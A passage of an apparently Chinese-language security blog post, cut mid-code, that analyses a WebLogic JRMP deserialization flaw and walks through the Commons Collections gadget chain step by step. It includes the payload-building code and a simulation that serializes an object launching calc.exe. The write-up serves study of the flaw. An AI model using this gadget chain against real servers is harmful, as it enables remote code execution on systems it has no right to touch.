class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">play</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WaY</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> can;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WaY</span><span class="params">(String name,<span class="keyword">boolean</span> can)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.can = can;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">play</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.can)&#123;</span><br><span class="line">            System.out.println(<span class="keyword">this</span>.name + <span class="string">&quot; play! &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.can;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name + <span class="string">&quot; work! &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Person p;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Server</span><span class="params">(String name,<span class="keyword">boolean</span> play)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.p = <span class="keyword">new</span> WaY(name,play);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">3001</span>);</span><br><span class="line">            Naming.bind(<span class="string">&quot;//localhost:3001/person&quot;</span>,<span class="keyword">this</span>.p);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException | AlreadyBoundException | MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 开启服务</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Server s = <span class="keyword">new</span> Server(<span class="string">&quot;dqv5&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line">            s.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">            s.start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e )&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 等待片刻后访问</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            Person p = (Person) Naming.lookup(<span class="string">&quot;//localhost:3003/person&quot;</span>);</span><br><span class="line">            p.play();</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException | MalformedURLException | NotBoundException | RemoteException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本地监听👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114132352099.png" alt="image-20220114132352099"></p>
+<p>在物理机起一个 <code>jrmp</code> 的服务，然后通过中转监听来看看从 <code>jrmp</code> 服务发过去的内容👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114133604192.png" alt="image-20220114133604192"></p>
+<p>那么现在就一目了然了，显然上边的一系列操作即是让目标作为客户端主动通过 <code>jrmp</code> 协议和搭建在攻击机本地的 <code>jrmp</code> 服务端进行通信，然后攻击机上的本地 <code>jrmp</code> 服务会将构造好的序列化内容发送给目标客户端，目标客户端会无条件反序列化这些内容，从而反序列化漏洞由此产生；若再对这些反序列化内容进行构造就很可能造成远程代码执行。</p>
+<p>接下来不妨分析一下这个能造成远程代码执行的序列化内容，很明显的可以从服务端发送过去的 <strong>payload</strong> 看到序列化入口点的类👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114135000278.png" alt="image-20220114135000278"></p>
+<p>跟进 <code>javax.management.BadAttributeValueException</code> 类，众所周知再这个类中是可以调用可控类的 <code>toString</code> 方法的👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114150418749.png" alt="image-20220114150418749"></p>
+<p>接着再看通讯的内容👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114151012827.png" alt="image-20220114151012827"></p>
+<p>令人吃惊的是，在 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 中并没有对 <code>toString</code> 方法的重写，也就是说这个 <strong>payload</strong> 并没有利用到 <code>javax.management.BadAttributeValueException</code> 类中可以调用可控类的 <code>toString</code> 方法的功能，只是简单的将其 <code>val</code> 属性赋值为前者罢。那么再跟进 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类，可以发现其实现了 <code>Serializable</code> 接口，并且拥有 <code>readObject</code> 方法，这么来看的话上边 <code>javax.management.BadAttributeValueException</code> 用 <code>val</code> 属性的包装仅是用来作为 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的携带者👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114154205492.png" alt="image-20220114154205492"></p>
+<p>ok，现在知道了整个链条的准确开头应该就是从 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类的 <code>readObject</code> 开始了，该是分析链条主体部分的时候了，先看主体 <strong>payload</strong> 的构造源码👇</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">		<span class="comment">// inert chain for setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">			<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">		<span class="comment">// real chain for after setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">					String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">					<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">					Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">					<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">					<span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> handler;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>看起来主要是使用了 <code>Transformer</code> 、 <code>ConstantTransformer</code> 、<code>InvokerTransformer</code> 以及 <code>ChainedTransformer</code> 这几个玩意儿来构造链，不妨先对这三个玩意进行分析。首先这几个玩意都是来自 <code> Apache Commons Collections</code> 库，而 <code>weblogic</code> 使用了同属这个库基本概念的 <code>org.apache.commons.collections</code> 包👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114173541816.png" alt="image-20220114173541816"></p>
+<p>其中， <code>Transformer</code>  这玩意是一个接口，并且定义了 <code>transform</code> 方法；而 <code>InvokerTransformer</code> 这个类不仅实现了 <code>Transformer</code> 以及 <code>Serializable</code> 接口，在它的 <code>transform</code> 方法中还通过反射使得让使用可控参数调用任意类的任意方法成为可能👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114180040160.png" alt="image-20220114180040160"></p>
+<p>并且这些关键属性也都是可以在构造方法中赋值的👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114182830903.png" alt="image-20220114182830903"></p>
+<p>接着看 <code>ChainedTransformer</code> ，这也是一个实现了 <code>Transformer</code> 和 <code>Serializable</code> 接口的类，在其中它的 <code>transform</code> 方法是遍历装有任意实现了 <code>Transformer</code> 接口的实例，并依次调用每一个数组元素的 <code>transform</code> 方法，同时在先将传入参数作为首个元素调用 <code>transform</code> 方法的参数后，往后都是将上一个元素通过调用 <code>transform</code> 方法得到的返回值作为下一个元素调用 <code>transform</code> 方法的参数👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114181346192.png" alt="image-20220114181346192"></p>
+<p>若用 <code>ChainedTransformer</code> 将多个实现了 <code>Transformer</code> 的 <code>InvokerTransformer</code> 串起来就可以将单次的使用可控参数去调用任意类的任意方法的形式通过循序渐进变为形如可以调用 <code>java.lang.Runtime.getRuntime().exec()</code> 这样的形式。</p>
+<p>那么再看 <code>ConstantTransformer</code> ，这玩意同样实现了 <code>Transformer</code> 和 <code>Serializable</code> 接口的类，其 <code>transform</code> 方法作用是返回其私有变量 <code>iConstant</code> 的值，因此可以通过序列化将这个值控制成一个形如 <code>java.lang.Runtime</code> 的值👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114182401083.png" alt="image-20220114182401083"></p>
+<p>此时回头看一下 <strong>payload</strong> 中的主要链条部分，思路就较为清晰了，以下这个数组在最后会放到 <code>ChainedTransformer</code> 中👇</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">	<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">	<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">	<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">	<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ....</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>第一步，由 <code>ConstatnTransformer</code> 获取 <code>java.lang.Runtime.class</code> 值；</li>
+<li>第二步，将 <code>java.lang.Runtime.class</code> 作为参数，通过 <code>getMethod</code> 先将 <code>java.lang.Runtime.class.getClass()</code> 的 <code>getMethod</code> 方法赋值给 <code>method</code> ，然后使用 <code>method.invoke</code>  即 <code>java.lang.Runtime.class.getClass().getMethod.invoke</code> 去获取 <code>java.lang.Runtime.getRuntime</code> 方法本身；</li>
+<li>第三步，将 <code>java.lang.Runtime.getRuntime</code> 方法本身作为参数，通过 <code>getMethod</code> 先将 <code>java.lang.Runtime.getRuntime.getClass()</code> 的 <code>invoke</code> 方法赋值给 <code>method</code> ，然后使用 <code>method.invoke</code> 即 <code>java.lang.Runtime.getRuntime.getClass().invoke.invoke</code> 去调用本身得到 <code>java.lang.Runtime.getRuntime()</code> 结果；</li>
+<li>第四步，将 <code>java.lang.Runtime.getRuntime()</code> 结果作为参数，通过 <code>getMethod</code> 先将 <code>java.lang.Runtime.getRuntime().getClass()</code> 的 <code>exec</code> 方法赋值给 <code>method</code> ，然后使用 <code>method.invoke</code> 即 <code>java.lang.Runtime.getRuntime().getClass().exec.invoke</code> 配合后边的 <code>execArgs</code> 参数达成形如 <code>java.lang.Runtime.getRuntime().exec(execArgs)</code> 的形式。</li>
+</ul>
+<p>然而既然已经拿到了主要链条，现在最需要关注的是如何让这个主要链条生效，再看一下 <strong>payload</strong> 后续处理的部分👇</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到，存储上边链条且属于 <code>ChainedTransformer</code> 实例的 <code>transformerChain</code> 连同新实例化的 <code>HashMap</code> 被作为参数去调用了 <code>LazyMap.decorate</code> ，先跟进 <code>LazyMap.decorate</code> ，这个类依然实现了 <code>Serializable</code> 接口👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114204951531.png" alt="image-20220114204951531"></p>
+<p>此时， <code>LazyMap</code> 类的 <code>factory</code> 变量即为 <code>transformerChain</code> 的值。由于这个 <code>LazyMap</code> 也实现了 <code>Map</code> 接口，接着往下看👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114205351956.png" alt="image-20220114205351956"></p>
+<p>事实上，由于 <code>factory</code> 的值为 <code>transformerChain</code> 的值，其为 <code>ChainedTransformer</code> 的实例，当这个 <code>transformerChain</code> 调用了 <code>transform</code> 方法时，也就会对其存储的每个链条调用 <code>transform</code> 方法从而形成一条能够组成 <code>java.lang.Runtime.getRuntime().exec(execArgs)</code> 形式的链条。比如以下例子👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114210556252.png" alt="image-20220114210556252"></p>
+<p>接着就是得找一个能够调用 <code>get</code> 方法的形式了，不妨回过头来看有关 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的 <code>invoke</code> 方法。由于本地环境的版本太新，漏洞点已经修复，这里就用环境的jdk来复现(<strong>版本 jdk1.6.0_45</strong>)👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220115181602486.png" alt="image-20220115181602486"></p>
+<p>可见只要能够给 <code>memberValues</code> 构造适当的值就可以在反序列化时调用其自身的 <code>invoke</code> 方法进而调用 <code>get</code> 方法，这实际上概括说来即是 <strong>我自己，就是我自己的代理</strong> 。为实现这种形式，可以使用实例套代理的模式，第一个 <code>AnnotationInvocationHandler</code> 实例的 <code>memberValues</code> 属性存放着 <strong>payload</strong> 内容，第二个 <code>AnnotationInvocationHandler</code> 的 <code>memberValues</code> 属性存放着第一个 <code>AnnotationInvocationHandler</code> 实例的代理。</p>
+<p>也就是说在第二个 <code>AnnotationInvocationHandler</code> 实例调用 <code>readObject</code> 方法中，<code>this.memberValues</code> 的值为第一个 <code>AnnotationInvocationHandler</code> 实例关于 <code>Map</code> 接口的代理；当执行到 <code>this.memberValues.entrySet()</code> 时会调用第一个 <code>AnnotationInvocationHandler</code> 实例的 <code>invoke</code> 方法，而第一个 <code>AnnotationInvocationHandler</code> 实例的 <code>this.memberValues</code> 值为上边包装好 <strong>payload</strong> 内容且实现了 <code>Map</code> 接口的 <code>LazyMap</code> ，一旦执行了 <code>this.memberValues.get</code> 就会层层触发直至 <code>java.lang.Runtime.getRuntime().exec(execArgs)</code> ，比如简单模拟一下👇</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">(Map&lt;String,Object&gt; m)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = m;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String member = method.getName();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            省略部分代码</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.memberValues.get(member);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            省略部分代码</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Payload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">generate</span><span class="params">(String[] execArgs)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ChainedTransformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> lazyMap;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成payload</span></span><br><span class="line">        Map&lt;String, Object&gt; m = Payload.generate(<span class="keyword">new</span> String[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 代理嵌套</span></span><br><span class="line">        Evil e1 = <span class="keyword">new</span> Evil(m); <span class="comment">// 用作存放payload数据</span></span><br><span class="line">        Map p = (Map) Proxy.newProxyInstance(Evil.class.getClassLoader(),<span class="keyword">new</span> Class&lt;?&gt;[]&#123;Map.class&#125;,e1);</span><br><span class="line">        Evil e2 = <span class="keyword">new</span> Evil(p); <span class="comment">// 用作存放e1关于Map接口的代理</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>));</span><br><span class="line">        out.writeObject(e2);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待片刻</span></span><br><span class="line">        Thread.sleep(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span 